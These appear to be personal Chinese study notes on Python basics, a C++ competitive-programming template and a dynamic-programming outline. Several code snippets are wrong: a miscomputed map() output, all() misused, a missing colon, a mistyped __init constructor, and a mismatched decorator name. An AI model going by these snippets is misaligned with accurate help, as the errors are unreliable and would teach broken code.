- 没有append，insert这些方法
- 定义一个空元组()，
- 定义一个元素的元组需要用(1,)，以此与单纯的小括号区分
- The elements in a tuple or list are ordered!  =>  元素相对顺序确定，不是已排好序，能不能直接 [] 来访问

切片

- [a:b]  => [a, b) 从 a 开始，不包括 b
- a = 0 是可省略，b 为最后一个也可省略
- 为负数时意味着倒数
- [a:\b:c] c 为步长 ，L[::-1] 逆转
- tuple也能切片，切出来仍然是一个tuple
- L[1:-1]  =>  第一个到倒数第二个
- L = (1,2)  => 2*L = (1, 2, 1, 2)

dict

- {}  创建空 dict，{1,2} 是 set，d = {40:"john", 45:"peter"} 这样也是正确的
- 直接 d['xxx'] ，如果 xxx 不存在就会报错：KeyError（事先 in 判断一下），此时可以用 get() ，不存在就会返回 none
- 使用 pop() 删除 key，其对应的 value 也会被删掉
- dict 无 delete 方法，可以 del d["john"]，不能 del d("john":40)
- dict 之间无法进行 > 大小比较，但是可以判断是否相等

set

- set() 创建空 set
- list("abac")  =>  ['a', 'b', 'a', 'c']
- tuple("abac")  =>  ('a', 'b', 'a', 'c')
- set("abac")  =>  {'a', 'b', 'c'}  重复元素在set中自动被过滤
- add() 添加元素，remove() 删除元素
- 两个 set 进行 < , >比较，比的是 集合的包含关系
- set 中的元素不能通过 [] 索引来获取
- s1.issubset(s2)  =>  s1 是 s2 的子集
- s1 ^ s2  =>  (s1-s2) | (s2-s1)
- 2 * s1 是非法的
- 不能 s1 + s2，取并集只能 | 

file IO

- 如果文件不存在，`open()`函数就会抛出一个`IOError`的错误，并且给出错误码和详细的信息告诉你文件不存在
- read(size)  每次读取size个字节内容，为写size则读取全部内容
- readline() 每次读取一行内容，读取下一行
- readlines() 一次读取所有内容并返回 list
- os.path.exists('/etc/passwd') 判断是否存在
- dialog

**小诗**

```python
s = """Gur Mra bs Clguba, ol Gvz Crgref
Ornhgvshy vf orggre guna htyl.
Rkcyvpvg vf orggre guna vzcyvpvg.
Fvzcyr vf orggre guna pbzcyrk.
Pbzcyrk vf orggre guna pbzcyvpngrq.
Syng vf orggre guna arfgrq.
Fcnefr vf orggre guna qrafr.
Ernqnovyvgl pbhagf.
Fcrpvny pnfrf nera'g fcrpvny rabhtu gb oernx gur ehyrf.
Nygubhtu cenpgvpnyvgl orngf chevgl.
Reebef fubhyq arire cnff fvyragyl.
Hayrff rkcyvpvgyl fvyraprq.
Va gur snpr bs nzovthvgl, ershfr gur grzcgngvba gb thrff.
Gurer fubhyq or bar-- naq cersrenoyl bayl bar --boivbhf jnl gb qb vg.
Nygubhtu gung jnl znl abg or boivbhf ng svefg hayrff lbh'er Qhgpu.
Abj vf orggre guna arire.
Nygubhtu arire vf bsgra orggre guna *evtug* abj.
Vs gur vzcyrzragngvba vf uneq gb rkcynva, vg'f n onq vqrn.
Vs gur vzcyrzragngvba vf rnfl gb rkcynva, vg znl or n tbbq vqrn.
Anzrfcnprf ner bar ubaxvat terng vqrn -- yrg'f qb zber bs gubfr!"""

d = {}
for c in (65, 97):
    for i in range(26):
        d[chr(i+c)] = chr((i+13) % 26 + c)

print "".join([d.get(c, c) for c in s])
```

### 并发

**相关概念**

> + 程序、线程、进程、多进程、多线程
> + 线程的生命周期
> + 并行与并发，同步与异步
> + 线程同步安全
> + 与锁有关的特殊情况：死锁、饥饿与活锁
> + 守护线程
> + 线程并发的经典问题：生产者与消费者问题
> + Python 中的 GIL 锁
> + Python 中对多线程与多进程的支持

进程是 CPU 资源分配的最小单位，线程是 CPU 调度的最小单位。线程是建立在进程的基础上的运行单位，由程序负责管理，而进程则由系统进行调度。

协程呢？简单点说协程是进程和线程的升级版，两者因为内核态和用户态的切换问题而耗费许多切换时间，而协程就是用户自己控制切换的时机，不再需要陷入系统的内核态。Python 里最常见的 yield就是协程的思想！

具体的查看 [Python各类并发模版](https://momomoxiaoxi.com/python/2019/03/12/python)





### 杂项

```python
ord()  					# ASCII码
chr()  					# 对应char
isinstance(x, str)   	# 判断x是否是字符串？

zip()					# 拉链，打包成一个个元组
a = [1, 2, 3]
b = [4, 5, 6]
zipped = zip(a, b)
zipped = [(1, 4), (2, 5), (3, 6)]
c = zip(*zipped)		# 相当于解压，返回二维矩阵式
c = [(1, 2, 3), (4, 5, 6)]

all(True, True, True)	# 全为真才为真（与）
any(False, True, False)	# 有真即为真（或）
arr = [1, 3, 3, 5]
sum(arr)				# arr元素的和
max(arr)				# arr的最大值
min(arr)				# arr的最小值

# 导入MySQL驱动:
>>> import mysql.connector
# 注意把password设为你的root口令:
>>> conn = mysql.connector.connect(user='root', password='password', database='test')
>>> cursor = conn.cursor()
# 创建user表:
>>> cursor.execute('create table user (id varchar(20) primary key, name varchar(20))')
# 插入一行记录，注意MySQL的占位符是%s:
>>> cursor.execute('insert into user (id, name) values (%s, %s)', ['1', 'Michael'])
>>> cursor.rowcount
1
# 提交事务:
>>> conn.commit()
>>> cursor.close()
# 运行查询:
>>> cursor = conn.cursor()
>>> cursor.execute('select * from user where id = %s', ('1',))
>>> values = cursor.fetchall()
>>> values
[('1', 'Michael')]
# 关闭Cursor和Connection:
>>> cursor.close()
True
>>> conn.close()
```

### Tuple 与 List

```python
# []————list
classmates = ['Michael', 'Bob', 'Tracy']
classmates.append('xiaoyu')
print(classmates[-1])
classmates.pop()
print(classmates[-1])
s = ['python', 'java', ['asp', 'php'], 'scheme']
print(len(s))  

# ()————tuple
t = ('jj',)  # 单个元素时加“，” 是为了消除()带来的歧义,防止解释器理解为数学上的小括号
# 一旦定义则不可变的tuple的意义为相比list更安全,所以能用tuple的地方不要用list
t = ('a','b',['A','B'])
t[2][1] = 'B'
t[2][2] = 'A'
# 此时的tuple又变长“可变”了，原因只有一个，tuple的不变说的是指向不变，而不是说元素不变
print(len(t))

length = input('请输入你的身高：')
height = input('请输入你的体重:')	# input()函数直接返回的是str类型
length = int(length)			 # 所以需要先强制转换一下
height = int(height)
```

### 循环

```python
names = ['Michael', 'Bob', 'Tracy']
for name in names:
    print(name)

sum = 0
for x in range(101):
    sum += x
print(sum)

sum = 0
n = 99
while n > 0:
    sum += n
    n -= 1
print(sum)

L = ['Bart', 'Lisa', 'Adam']

for l in L:
    print('Hello,%s' % l)
```

### Dist 与 Set

```python
# dist 相当于STL中的map,采用 key—value 存储
d = {'Michael': 95, 'Bob': 75, 'Tracy': 85}
d['Michael'] = 95


# set 与 dist 类似，但不存储 value。
s = set([1, 2, 3])

add()	  # s.add(4)
remove()  # s.remove(4)

# set 可看做数学意义上的无序和无重复元素的集合，因此，两个 set 可以做数学意义上的交、并集操作
s1 = set({1, 2, 3})
s2 = set({2, 3, 4})
s1 & s2
s1 | s2
```

### 函数

+ pass————如果想定义一个什么事也不做的函数

```python
# 比如现在没想好写函数的具体实现，就可以使用 pass 占位，使得程序先跑起来
# 没写 pass 的空函数将会报错

def nop():
    pass
```

+ isinstance()————内置了参数类型检查函数

```python
def my_abs(x):
    if not isinstance(x, (int, float)):
        raise TypeError('Bad operand type')
    if x >= 0:
        return x
    else 
        return -x
```

+ 函数返回多个值(本质就是返回一个tuple)

```python
import math
def move(x, y, step, angle = 0):
    nx = x + step * math.cos(angle)
    ny = y - step * math.sin(angle)
    return nx, ny

nx, ny = move() # 接收多个返回值
r = move(100, 100, 60, math.pi / 6)
print(r)
(151.96152422706632, 70.0)

# 在语法上，返回一个tuple可以省略括号，而多个变量可以同时接收一个tuple，按位置赋给对应的值
# 所以函数返回的就是一个tuple，但写起来很方便

# 函数执行完毕后也没有 return 语句时，将自动 return none
```

+ 可变参数————*

```python
#  定义默认参数要牢记一点：默认参数必须指向不变对象！并且放在后面
# 定义可变参数和定义一个list或tuple参数相比，仅仅在参数前面加了一个*号。
# 在函数内部，参数numbers接收到的是一个tuple，因此，函数代码完全不变。
# 但是，调用该函数时，可以传入任意个参数，包括0个参数：

def calc(*numbers):
    sum = 0
    for n in numbers:
        sum += n * n
    return sum

calc(1,2,3)
calc(3,4,2,25,4)

# 用起来是不是很舒服呀？
# 相当于省略了创建 tuple、list 的过程，一步到位

# 如果已经有一个list或tuple，要调用可变参数怎么办，可以这样做
nums = [1,3,5]
calc(nums[0], nums[1], nums[2])

# 显然如此处理太繁琐，办法来了:
nums = [1,3,5]
calc(*nums)
```

+ 关键字参数————**

```python
# 关键字参数允许你传入0个或任意个含参数名的参数，这些关键字在函数内部自动组装为一个 dict

def person(name, age, **kw):
    print('name:', name, 'age:', age, 'other:', kw)

person('Michael', 30)  # name: Michael age: 30 other: {}
person('Michael', 30,city='Beijing')  # name: Michael age: 30 other: {'city': 'Beijing'}
# 关键字参数可以扩展函数的功能。比如在person函数中既可以接收必要的参数，但是，
# 如果调用者愿意提供更多的参数，我们也能收到。
# 试想，你正在做一个用户注册的功能，除了用户名和年龄是必选项，其他都是可选项，
# 利用关键字参数来定义这个函数就能满足注册的需求

extra = {'city': 'Beijing', 'job': 'Engineer'}
person('Jack', 24, **extra)
# name: Jack age: 24 other: {'city': 'Beijing', 'job': 'Engineer'}
```

+ 命名关键字参数
+ 参数组合

```python
# 在Python中定义函数，可以用必选参数、默认参数、可变参数、关键词参数和命名关键词参数，这5中参数都可以组合使用。
# 但参数定义的顺序必须是：必选、默认、可变、命名关键字、关键字
```

+ 递归函数

```python
def fact(n):
    if n == 1:
        return 1
    return fact(n-1)*n

print(fact(99))

尾递归优化

def fac(n):
    return fact_iter(n, 1)

def fact_iter(num, product):
    if num == 1:
        return product
    return fact_iter(num - 1, num * product)
# 优点：如果做了优化，栈不会增长，无论调用多少次也不会栈溢出
# 尾递归和循环是等价的，没有循环语句的编程语言只能通过尾递归实现循环
# 然而，注意是然而，Python标准的解释器没有针对尾递归做优化，任何递归函数都存在栈溢出问题

# 简单的汉诺塔
def move(n,a,b,c):
    if n == 1:
        print(a, '-->', c)
        return
    move(n-1, a, c, b)
    print(a, '-->', c)
    move(n-1, b, a, c)

# move(3, 'A', 'B', 'C')
```



### 切片

```python
# 切片————[a ：b]，索引从a取到b（不包括b）
L = ['Michael', 'Sarah', 'Tracy', 'Bob', 'Jack']
print(L[0:3])

# 从0开始时可以省略(索引从0开始)
print(L[:3])

# 倒着取
print(L[-2:])  # 从L[-2]到结尾

# 遍历整个list或tuple
print(L[:])

L = list(range(100))
L[:10]  	# 前10个数
L[-10:]  	# 后10个数
L[10:20]  	# 前11~20个数
L[:10:2]  	# 前10个数，每两个取1个
L[::5]  	# 所有数，每5个取一个


# 利用切片操作，实现一个trim()函数，去除字符串首尾的空格

def trim(s):
    if len(s) == 0:
        return s
    elif s[0] == ' ':
        return trim(s[1:])
    elif s[-1] == ' ':
        return trim(s[:-1])
    return s
# 这个思路真的很棒，谢谢原作者
```



### 迭代

```python
# 迭代永远是取出元素本身，而非元素的索引
# 如果给定一个list或tuple，我们可以通过for循环来遍历这个结构，这种遍历叫做迭代（iteration）

例题：在迭代 ['Adam', 'Lisa', 'Bart', 'Paul'] 时，
	 如果我们想打印出名次 - 名字（名次从1开始)，请考虑如何在迭代中打印出来。
zip()函数可以把两个list变成一个list
>>> zip([10, 20, 30], ['A', 'B', 'C'])
[(10, 'A'), (20, 'B'), (30, 'C')]

L = ['Adam', 'Lisa', 'Bart', 'Paul']
for index, name in zip(range(1, len(L)+1), L):
    print index, '-', name

# Python的for循环抽象程度是要高于c的，因为Python的for循环不仅可以用在list或tuple上，
# 还可以作用在其他的迭代对象上。只要是可迭代对象，无论有无下标，均可迭代，比如dict
d = {'a': 1, 'b': 2, 'c': 3}
for key in d:
    print(key)
# dict的存储不是按照 list 的方式顺序排列，每次的迭代的顺序可能不一样
# 默认情况下，dict 迭代的是 key
# 如果要迭代value
for value in d.values():
    print(value)
py3中抛弃了itervalues方法

# 如果要同时迭代 key 和 value
for k, v in d.items():	# items()返回的是包含tuple的list
    print('k = ', k, ', v = ', v)

# 字符串也是可迭代对象
for ch in 'ABC':
    print(ch)

# 那如何判断对象是否可迭代呢？
from collections import Iterable

print(isinstance('abc', Iterable))
print(isinstance([1, 2, 3], Iterable))
print(isinstance(123, Iterable))

# 如果对list实现类似Java那样的下标循环怎么办？
# enumerate()函数来救场,它可以把list变成索引——元素对
for i, value in enumerate(['A', 'B', 'C']):
    print(i, value)

for x, y in [(1, 1), (2, 4), (3, 9)]:
    print(x, y)
```



### 列表生成器

```python
# 生成[1, 2, 3, 4....]
list(range(1,11))

# 生成[1*1, 2*2, 3*3, 4*4....]
# 使用循环
L = []
for x in range(1, 11):
    L.append(x * x)
# 过于繁琐

# 列表生成器一句话搞定
L = [x * x for x in range(1, 11)]
print(L)

# for循环后面还可以加上if判断
L = [x * x for x in range(1, 11) if x % 2 == 0]

# 还可以使用两层循环，生成全排列
L = [m + n for m in 'ABC' for n in 'XYZ']
print(L)

# 运用列表生成器可以写出非常简洁的代码
# 例如，列出当前目录下的所有文件和目录名
import os
L = [d for d in os.listdir('.')]
print(L)

# 将list中的所有字符串变成小写
L = ['Hello', 'World', 'IBM', 'Apple']
H = [s.lower() for s in L]
print(H)

# for循环可以同时使用多个变量，因此，列表生成器也可以使用两个变量来生成list
d = {'x': 'A', 'y': 'B', 'z': 'C' }
L = [k + '=' + v for k, v in d.items()]
print(L)
```



### 生成器

```python
# 如果列表元素可以按照某种算法推算出来，那我们是否可以在循环的过程中不断推算出后续的元素呢？
# 这样就不必创建完整的list，从而节省大量的空间。
# 在Python中，这种一边循环一边计算的机制，称为生成器：generator

# 方法一：将列表生成器的 [] 改成 ()
L = [x * x for x in range(10)]
g = (x * x for x in range(10))
print(g)  
<generator object <genexpr> at 0x00000221BDA5CC00>

# 通过next()获得生成器的下一个值
# 因为generator也是可迭代对象，那就可以直接使用 for 循环
for n in g:
    print(n)

# 方法二：使用 yield
# 如果函数定义中包含了 yield 关键字，
# 那这个函数就不再是一个普通函数，
# 而是一个 generator

# 斐波那契数列
def fib(n):
    i, a, b = 0, 0, 1
    while i < n:
        print(b)
        a, b = b, a + b
        i = i + 1

fib(9)

# 升级为生成器
def fib(n):
    i, a, b = 0, 0, 1
    while i < n:
        yield b
        a, b = b, a + b
        i = i + 1

b = fib(9)
for i in b:
    print(i)
```



### 迭代器



###  函数式编程

- 把计算视为函数而非指令
- 纯函数式编程：不需要变量，没有副作用，测试简单
- 支持高阶函数，代码简洁

准则：**不依赖于外部的数据，而且也不改变外部数据的值，而是返回一个新的值给你**。

理念：**把函数当成变量来用，关注于描述问题而不是怎么实现**

易读：**这样的代码是在描述要干什么，而不是怎么干**

#### 高阶函数

将函数作为参数传入函数


##### *map()*

把函数依次作用在 list 的`每个元素`上，得到一个`新的list`并返回

```python
[1, 2, 3, 4, 5, 6, 7, 8, 9]
# 如果把list的每个元素都平方，就可以用map()函数：
def f(x):
    return x*x
print map(f, [1, 2, 3, 4, 5, 6, 7, 8, 9])

# 结果：
>>> [1, 4, 9, 10, 25, 36, 49, 64, 81]
```

##### *reduce()*

必须接受两个参数，再把结果继续和序列的下一个元素做累积计算

```python
reduce(f, [a, b, c, d]) --> f(f(f(a, b), c), d)

>>> from functools import reduce
>>> print(reduce(lambda x, y: x + y, [1, 2, 3, 4, 5]))
15
```



##### *filter()*

挑出符合条件的元素

```python
>>> list(filter(lambda n: n % 2 == 1, [1, 2, 3, 4, 5]))
[1, 3, 5]
```



##### *sorted()*

能自定义比较规则的sort()?



#### 返回函数

#### 闭包

嵌套定义函数，内层函数引用了外层函数的局部变量，然后返回内层函数

```python
# 一般形式：
def g():
    print 'g()...'
def f():
    print 'f()...'
    return g

# 闭包大法后：
def f():
    print 'f()...'
    def g():
    	print 'g()...'
    return g
将g()挪到函数内部，防止其他代码调用g()

# 坑点：确保引用的局部变量在函数返回后不能变
# 希望一次返回3个函数，分别计算1X1,2X2，3X3：
def count():
    fs = []
    for i in range(1, 4):
        def f():
            return i * i
        fs.append(f)
   	return fs

f1, f2, f3 = count()
# 结局是f1, f2, f3 全是9

# 正确写法：
def count():
    fs = []
    for i in range(1, 4):
        def f(j):
            def g():
                return j * j
            return g
        r = f(i)
        fs.append(r)
  	return fs
```



#### 匿名函数

需要一个函数，又懒得特地声明，此时就可以用`lambda`表达式

```python
arr = range(5)
print(map(lambda x: x*x, arr))			# 每个元素都平方一下
print(filter(lambda x: x%2==0, arr))	# 挑出偶数
```



#### 装饰器(decorator)

不改动原函数代码，在代码运行期间动态扩展原函数功能的一种机制。

实际上，装饰器就是一个返回函数的高阶函数（接收函数 -> 包装 -> 返回新函数）

使用方法：@+函数名

```python
# 可以极大地简化代码，避免每个函数写重复的代码
@log				# 打印日志
@performance		# 检测性能
@transaction		# 数据库事务
@post('/register')	# URL路由

def hello():
	print("Hello, World!")

# 添加功能：输出函数运行耗费的时间

import time
def metric(fn):
    def weapper(*args, **kwargs):
        start = time.time()
        res = fn(*args, **kwargs)
        end = time.time()
        print('%s executed in %s ms' % (fn.__name__, end - start))
        return res
    return weapper

@printTime
hello()
```



#### 偏函数

偏函数的意义在于固定某些可变参数，相当于“减饰器”

```python
# int() 可以把字符串转换为整数，但它还额外提供了 base参数，其默认值为10
# 如果传入 base参数，就可以做 N 进制转换
# 假设要转换大量二进制字符串，每次都传入int(x, base=2)非常麻烦，那么就可以定一个int2()
def int2(x, base=2):
    return int(x, base)

# functools.partial就是帮助我们创建这样一个偏函数的，不用自己特意定义int2()
int2 = functools.partial(int, base=2)
```

### 面向对象

```python
# 声明类，继承 object
class Student(object):
    # 类属性，可直接 Student.name 访问
    name = 'Student'
    # 构造函数
    def __init(self, name, score):
        self.name = name      # public
        self.__score = score  # __ => private
   

# 实例化对象
bart = Student()

# 获取对象信息
type()
isinstance()
dir()
```



### 异常处理

```python
try:
    # 可能出问题的代码
    pass
except 错误类型1:
    # 针对错误类型1进行处理的代码
   	pass
except 错误类型2:
    # 针对错误类型2进行处理的代码
   	pass
except Exception as e:  
    # 未知错误
    pass
else:
    # 正常情况该执行的代码
    pass
finally:
    # 无论是否有异常，都会执行的代码
    pass

# 异常的传递——当函数/方法执行出现异常，会讲异常传递给函数/方法的调用一方
若果传递到主程序，仍然没有异常处理，程序才会被终止
在开发中，可以利用异常的传递性，在主程序捕获异常
而在主函数中调用的其他函数，只要出现异常，都会传递到主函数的异常捕获中

# 主动抛出异常
	1.创建一个Exception的对象
    2.使用raise关键字抛出异常对象
    
# 样例：密码长度小于8则异常
def input_passwd():
    pwd = input("请输入密码：")
    
    if len(pwd) >= 8:
        return pwd
    print("主动抛出异常")
    # 创建对象
    ex = Exception("密码长度不够")
    # 主动抛出异常
    raise ex
 
try:
    print(input_passwd())
except Exception as e:
    print(e)
```



## ACM Tricks

```c++
//{{{ #include
#include <algorithm>
#include <iostream>
#include <cstring>
#include <vector>
#include <cstdio>
#include <string>
#include <cmath>
#include <queue>
#include <set>
#include <map>
#include <complex>
//#include <bits/stdc++.h>
//}}}
using namespace std;

typedef long long ll;
typedef long double ld;
typedef double db;
typedef pair<int,int> pii;
typedef vector<int> vi;

#define mp make_pair
#define fi first
#define se second
#define sf scanf
#define pf printf
#define pn printf("\n")
#define ls l,mid,rt<<1
#define rs mid+1,r,rt<<1|1
#define pb push_back
#define all(x) (x).begin(),(x).end()
#define de(x) cout << #x << "=" << x << endl
#define dd(x) cout<< #x<<" = "<<x<<" "
#define rep(i,a,b) for(int i=a;i<(b);++i)
#define per(i,a,n) for (int i=n-1;i>=a;i--)
#define mem(a,b) memset(a,b,sizeof(a))
#define sz(x) (int)(x).size()

const int INF=0x3f3f3f3f;
const double eps=1e-8;
const double PI=acos(-1.0);
const int N = 101010;

int sgn(double x){if(fabs(x)<eps)return 0;if(x<0)return -1;else return 1;}
ll gcd(ll a,ll b){return b==0?a:gcd(b,a%b);}

// fast-pow
int Pow(ll x,ll t,int p) {ll r=1;for(;t;t>>=1,x=x*x%p)if(t&1)r=r*x%p;return r;}

// add-mod
const int MOD = 1e9 + 7;
void pp(int &x,int d) {if((x+=d)>=MOD) x-=MOD;}
// minus-mod -> pp(a , P - x);

// multiply-mod
int mul(int a,int b){ return ll(a)*b%MOD;}

// inversion
int inverse(int x,int p) {return Pow(x,p-2,p);} // p should be prime

// tree-dp
vi g[N];
int sz[N];
void dfs(int c,int par){
  sz[c] = 1;
  for(auto t : g[c]) if(t != par){ // c++11
    dfs(t , c);
    sz[c] += sz[t];
  }
}

// dsu
int fa[N];
int F(int x){ return fa[x] == x ? x : fa[x] = F(fa[x]);}
void M(int x,int y){ fa[F(x)] = F(y);}

int main(){
  // swap
  int u = 0, v = 1;
  std::swap(u , v); // swap
  set<int> A , B;
  std::swap(A , B); // O(1)

  // minimal & maximal
  int a[20] , n = 20;
  rep(i,0,n) a[i] = i;
  cout << *std::max_element(a , a + n) << endl;// [a , a+n)
  cout << *std::min_element(a , a + n) << endl;

  // discretization
  vi V;// about 10 int
  sort(all(V));V.erase(unique(all(V)),V.end());
#define rk(x) upper_bound(all(V) , x) - V.begin()

  // deal with same value
  for(int i=0,j=0;i<sz(V);i=j) {
    for(j=i;j<sz(V)&&V[j]==V[i];++j);
    // Cal(i , j) //[i , j)
  }

  // multiple-loops
  int g[10][10] , m = 10;
  rep(i,0,m) rep(j,0,m) scanf("%d",&g[i][j]);

  // __builtin_popcount()
  int cnt1[1<<6];
  rep(i,1,1<<6) cnt1[i] = cnt1[i >> 1] + (i & 1);

  // sort
  int cnt[20];
  sort(all(V),[&](int a,int b){return cnt[a]<cnt[b];}); // c++11 
  vector<vi> Vv;
  sort(all(Vv));

  // sort with id
  vector<pii> p;
  rep(i,0,20) p.pb(mp(rand(),i));
  sort(all(p));

  // deal with subsets
  rep(mask,0,1<<10)
    for(int j=mask;j;j=(j-1)&mask)
      ;// Cal

  // high-dimensional prefix-sum
  int f[1<<10];
  rep(i,0,10) rep(j,0,1<<10) if(j>>i&1) pp(f[j],f[j^(1<<i)]);

  // permutation
  rep(i,0,7) a[i] = i;
  do{
    // Cal;
  }while(next_permutation(a , a + 7));

  // fill function
  std::fill(a , a + 20 , 0);// fill any number

  // reference
  int &r=f[10];
  rep(i,0,10) r+=i;

  // ternary operator
  int C[10][10] = {{1}};
  rep(i,1,10) rep(j,0,i+1) C[i][j] = j ? (C[i-1][j-1] + C[i-1][j]) : 1;

  return 0;
}
```



## *Dynamic Programing*

+ 第一。先找到原问题和其子问题们之间的关系，写出递归形式。如此一来，便可利用递归公式，用子子问题的答案求出子问题的解；用子问题的解，求出原问题的解。

+ 第二。确认可能出现的问题总共有哪些，这样才能知道要计算哪些问题，才能知道总共花多少时间、多少记忆体。
+ 第三。有了递归公式之后，就必须安排一套计算的顺序。大问题的答案，总是以小问题的答案来求得的，所以，小问题的答案必须先计算，否则大问题的答案从何而来？一个好的安排，不但使程序容易编写，还可重复利用记忆体空间。
+ 第四。记得先捋最小、最先被计算的问题，心算出答案，储存入表格，内建于程序中。一道递归公式必须拥有初始值，才有办法计算其他项。
+ 第五。实践 $DP$ 的程序时，会建立一个表格，在表格存入所有大小问题的答案。安排好每个问题在表格的位置，这样计算时才能知道在哪取值。切勿存取超出表格的元素，产生溢出情形，导致答案算错。计算过程当中，一旦某个问题的答案出错，就会如同多米诺骨牌效应般影响整体，造成很难除错。



### 分类

+ 线性dp
+ 背包
+ 区间dp
+ 数位dp
+ 状压dp
+ 树形dp
+ 概率dp



### 基础

+ 序列型
+ 背包型
+ 区间型
+ 环形
+ 棋盘型
+ 普通多维

### 进阶

+ 复杂多维
+ 多线程
+ 数位
+ 期望
+ 状压基础

### 高级

+ 树形
+ $DP$ 优化
+ 状压进阶
+ 插头
+ 博弈论
+ $DP$ 套 $DP$



